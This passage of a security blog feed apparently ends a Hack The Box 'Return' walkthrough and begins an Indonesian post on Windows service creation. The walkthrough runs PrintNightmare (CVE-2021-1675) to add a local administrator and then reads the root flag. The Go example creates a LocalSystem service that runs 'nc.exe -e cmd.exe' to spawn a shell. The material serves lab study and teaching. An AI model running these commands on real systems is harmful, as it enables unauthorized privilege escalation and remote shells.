</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User permissions to remove on C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">FileSystemRights  : FullControl
</span></span><span class="line"><span class="cl">AccessControlType : Allow
</span></span><span class="line"><span class="cl">IdentityReference : RETURN<span class="se">\s</span>vc-printer
</span></span><span class="line"><span class="cl">IsInherited       : False
</span></span><span class="line"><span class="cl">InheritanceFlags  : ContainerInherit, ObjectInherit
</span></span><span class="line"><span class="cl">PropagationFlags  : None
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Acls changed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Path   : Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">Owner  : BUILTIN<span class="se">\A</span>dministrators
</span></span><span class="line"><span class="cl">Group  : RETURN<span class="se">\D</span>omain Users
</span></span><span class="line"><span class="cl">Access : NT AUTHORITY<span class="se">\S</span>YSTEM Allow  FullControl
</span></span><span class="line"><span class="cl">         BUILTIN<span class="se">\A</span>dministrators Allow  FullControl
</span></span><span class="line"><span class="cl">         RETURN<span class="se">\A</span>dministrator Allow  FullControl
</span></span><span class="line"><span class="cl">Audit  :
</span></span><span class="line"><span class="cl">Sddl   : O:BAG:DUD:AI<span class="o">(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>SY<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>BA<span class="o">)(</span>A<span class="p">;</span>OICIID<span class="p">;</span>FA<span class="p">;;;</span>LA<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">Access to the path <span class="s1">&#39;\\printer\c$\users\administrator\desktop\root.txt&#39;</span> is denied.
</span></span><span class="line"><span class="cl">At line:1 char:1
</span></span><span class="line"><span class="cl">+ gc <span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
</span></span><span class="line"><span class="cl">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class="line"><span class="cl">    + CategoryInfo          : PermissionDenied: <span class="o">(</span><span class="se">\\</span>printer<span class="se">\c</span>$<span class="se">\u</span>s...esktop<span class="se">\r</span>oot.txt:String<span class="o">)</span> <span class="o">[</span>Get-Content<span class="o">]</span>, UnauthorizedAccessException
</span></span><span class="line"><span class="cl">    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
</span></span></code></pre></div><h4 id="alternative--printnightmare-lpe">(Alternative)  PrintNightmare LPE</h4>
<p>And here&rsquo;s the ultimate exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Nightmare -NewUser <span class="s2">&#34;choropys&#34;</span> -NewPassword <span class="s2">&#34;ch0ropys!&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> created payload at C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> using <span class="nv">pDriverPath</span> <span class="o">=</span> <span class="s2">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> added user choropys as <span class="nb">local</span> administrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> deleting payload from C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\n</span>ightmare.dll
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">Administrator            choropys                 Guest
</span></span><span class="line"><span class="cl">krbtgt                   svc-printer
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed with one or more errors.
</span></span></code></pre></div><p>The hard way to read the root flag (afaik this won&rsquo;t work if WinRM disabled).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;choropys&#34;</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s2">&#34;ch0ropys!&#34;</span> -AsPlainText -Force
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; <span class="nv">$cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gci C:/users/administrator/desktop/root.txt <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name                                                                                                 PSComputerName
</span></span><span class="line"><span class="cl">----                -------------         ------ ----                                                                                                 --------------
</span></span><span class="line"><span class="cl">-ar---       10/14/2021  10:33 PM             <span class="m">34</span> root.txt                                                                                             localhost
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\c</span>hrp&gt; Invoke-Command -Computer localhost -Credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> gc C:/users/administrator/desktop/root.txt <span class="o">}</span>
</span></span><span class="line"><span class="cl">9f8dd...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Windows Services: Start a Service During Its Creation [ID]</title>
      <link>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</link>
      <pubDate>Thu, 12 Aug 2021 22:04:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</guid>
      <description>Eksplorasi Windows Service</description>
      <content:encoded><![CDATA[<p>Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas tentang Windows Service. Postingan pertama adalah &ldquo;beyond root&rdquo; dari mesin Resolute dari Hack The Box yang ditulis oleh <a href="https://twitter.com/0xdf_">0xdf</a> dan yang kedua adalah postingan yang ditulis oleh <a href="https://twitter.com/VbScrub">VbScrub</a>. Kedua postingan tersebut dapat dibaca ditautan berikut:</p>
<ul>
<li>
<p><a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html">https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></p>
</li>
<li>
<p><a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></p>
</li>
</ul>
<p>Di postingan pertama, 0xdf lebih membahas tentang <code>psexec</code>-nya Impacket dan tool serupa lainnya (teknikal), sedangkan di postingan kedua, VbScrub melanjutkan <em>kulikan<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>nya</em>-nya 0xdf dan lebih membahas tentang Windows service-nya.</p>
<p>Berkat kedua postingan tersebut, saya jadi tertarik juga untuk ngulik dan nyelam ke dokumentasi API Windows service.</p>
<p>Sekilas definisi, service sederhananya service adalah suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, biasanya disebut Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.</p>
<p><div class="img-container"><img src="imgs/image-20210812024145951.png" alt="image-20210812024145951"  /></div>
</p>
<div class="force-center"><small> Sumber colongan tertera </small></div>
<h2 id="creation-of-a-service">Creation of a Service</h2>
<p>Pada Windows, sebuah service dapat dibuat dengan menggunakan command-line utility bawaan Windows bernama <code>sc.exe</code>. Berikut contoh penggunaannya.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span> sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\program.exe&#34;</span>
</span></span></code></pre></div><ul>
<li>MyService = Nama service</li>
<li>binPath = Lokasi executable program (+ argument)</li>
</ul>
<p>Kedua argumen diatas wajib disuplai (minimal).</p>
<p>Pembuatan service <code>MyService</code> akan berhasil jika perintah tersebut jalankan pada elevated (admin) terminal , atau user yang menjalankannya memiliki hak membuat service (<code>SC_MANAGER_CREATE_SERVICE</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
</span></span></code></pre></div><p>Jika bukan elevated atau tanpa hak untuk membuat service, maka hasil yang diberikan oleh <code>sc.exe</code> adalah pesan &ldquo;Access is denied&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> OpenSCManager FAILED 5:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Access is denied.
</span></span></code></pre></div><p>Sedangkan untuk mengetahui tahap pembuatan/instalasi sebuah service, kita bisa mengacu kepada contoh kode bahasa C dari <a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service">dokumentasi Microsoft</a> berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">SvcInstall</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">SC_HANDLE</span> <span class="n">schSCManager</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SC_HANDLE</span> <span class="n">schService</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">TCHAR</span> <span class="n">szPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="n">GetModuleFileName</span><span class="p">(</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">szPath</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot install service (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">     <span class="c1">// Creation of a Service: STEP 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Get a handle to the SCM database.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">schSCManager</span> <span class="o">=</span> <span class="n">OpenSCManager</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// local computer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// ServicesActive database
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>  <span class="c1">// full access rights
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">schSCManager</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;OpenSCManager failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">     <span class="c1">// Creation of a Service: STEP 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Create the service
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">schService</span> <span class="o">=</span> <span class="n">CreateService</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">schSCManager</span><span class="p">,</span>              <span class="c1">// SCM database
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// name of service
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// service name to display
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">szPath</span><span class="p">,</span>                    <span class="c1">// path to service&#39;s binary
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no load ordering group
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no tag identifier
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no dependencies
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// LocalSystem account
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">);</span>                     <span class="c1">// no password
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">schService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;CreateService failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Service installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Creation of a Service: STEP 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schService</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Secara garis besar, tahap pembuatan service adalah seperti berikut:</p>
<ol>
<li>Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw">OpenSCManager</a>. Fungsi ini mengembalikan sesuatu (return value) yang disebut <strong>handle</strong> (selanjutnya disebut <a href="https://docs.microsoft.com/en-us/windows/win32/services/scm-handles">handle SCM</a>). Handle SCM ini memegang level akses tertentu terhadap SCM, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-the-service-control-manager">disini</a>.</li>
<li>Handle SCM bersama dengan argumen lainnya yang disuplai seperti &ldquo;nama service&rdquo; dan &ldquo;binPath&rdquo; akan di-passing ke fungsi  <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">CreateService()</a> untuk membuat service. Fungsi <code>CreateService()</code> ini memiliki return value berupa <strong>handle</strong> (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service">disini</a>.</li>
<li>Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC <u>ditutup</u> dan program keluar.</li>
</ol>
<blockquote>
<ul>
<li>SCM sederhananya dapat dianggap sebagai database dari service.</li>
<li>Handle SCM menentukan apakah kita dapat melakukan read/write access pada SCM dan handle SVC menentukan apakah kita dapat mengontrol suatu service. Didapatkannya handle SVC sendiri bergantung pada level akses handle SCM.</li>
</ul>
</blockquote>
<p>Pada potongan kode sebelumnya akses handle SCM adalah <code>SC_MANAGER_ALL_ACCESS</code>, yang mana bisa diasumsikan bahwa hal ini memerlukan elevated process. Sedangkan berdasarkan kasus mesin Resolute yang diulas oleh 0xdf, handle SCM dengan akses <code>SC_MANAGER_CREATE_SERVICE</code> pun sudah cukup untuk membuat service.</p>
<h2 id="starting-a-service">Starting a Service</h2>
<p>Masih dengan tool yang sama (<code>sc.exe</code>), sebuah service dapat di jalankan dengan perintah berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>sc start MyService
</span></span></code></pre></div><p>Normalnya, service yang berhasil dibuat oleh user menggunakan <code>sc.exe</code> dalam mode elevated atau user dengan hak <code>SC_MANAGER_CREATE_SERVICE</code> tidak akan bisa dikontrol (start, stop) oleh <u>regular user</u>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc start MyService
</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> StartService: OpenService FAILED 5:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Access is denied.
</span></span></code></pre></div><p>Pada contoh diatas, pembuatan service berhasil karena user <code>fahmi</code> memiliki hak <code>SC_MANAGER_CREATE_SERVICE</code>, tetapi tidak memiliki kontrol atas service yang dibuatnya.</p>
<p>Jika melihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service">dokumentasi</a> Microsoft, yang juga dalam bahasa C, tahapan menjalankan sebuah service tanpa <code>sc.exe</code> secara garis besarnya adalah seperti berikut:</p>
<ol>
<li>Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu</li>
<li>Handle SCM kemudian di-passing ke fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew">OpenService()</a>. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.</li>
<li>Handle SVC yang didapat dipassing ke <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew">StartService</a> untuk mulai menjalankan service.</li>
</ol>
<p>Dari ketiga tahap menjalankan service tersebut, regular user tentunya akan mendapat galat berupa &ldquo;Access is denied&rdquo; di tahap 2 karena handle SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.</p>
<h2 id="dont-close-the-handles">Don&rsquo;t Close the Handles!</h2>
<p>Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi <code>CreateSevice()</code> dipanggil, ternyata si pembuat  service (level admin atau user dengan hak  <code>SC_MANAGER_CREATE_SERVICE</code>) bisa <strong>menentukan level akses dirinya terhadap service yang dibuat</strong> dan handle SVC yang dikembalikan oleh fungsi tersebut akan memiliki level akses yang sama.</p>
<p>Jadi, jika saat pembuatan service A, level akses yang disuplai adalah <code>SERVICE_ALL_ACCESS</code> (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A, yaitu full kontrol. Sayangnya handle SVC A ini ditutup berbarengan dengan handle SCM (tahap 3 pembuatan service).</p>
<p>Lalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi <code>StartService</code>? Hal inilah yang ditemukan oleh 0xdf dan VbScrub!</p>
<p>Untuk mencoba hal tersebut tentunya kita perlu membuat custom program dahulu dan berikut adalah program yang saya tulis dalam bahasa Go (Programnya versi argumen, bisa di cek <a href="https://github.com/fahmifj/winapi-go">disini</a>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;golang.org/x/sys/windows&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Creation of a Service: STEP 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Connect to scm to get a handle to create a service
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">scmHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">OpenSCManager</span><span class="p">(</span><span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">windows</span><span class="p">.</span><span class="nx">SC_MANAGER_CREATE_SERVICE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error cannot create a service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// define service
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">serviceName</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">&#34;MyService&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">serviceExecPath</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">`C:\myservice\nc.exe -e cmd.exe localhost 9000`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Creation of a ervice: STEP 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Create a service
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">svcHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">CreateService</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="nx">scmHandle</span><span class="p">,</span>                         <span class="c1">// SCM database
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">serviceName</span><span class="p">,</span>                       <span class="c1">// name of service
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// service name to display
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">serviceExecPath</span><span class="p">,</span>                   <span class="c1">// path to service&#39;s binary
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no load ordering group
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no tag identifier
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no dependencies
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// LocalSystem account
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no password
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;err&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
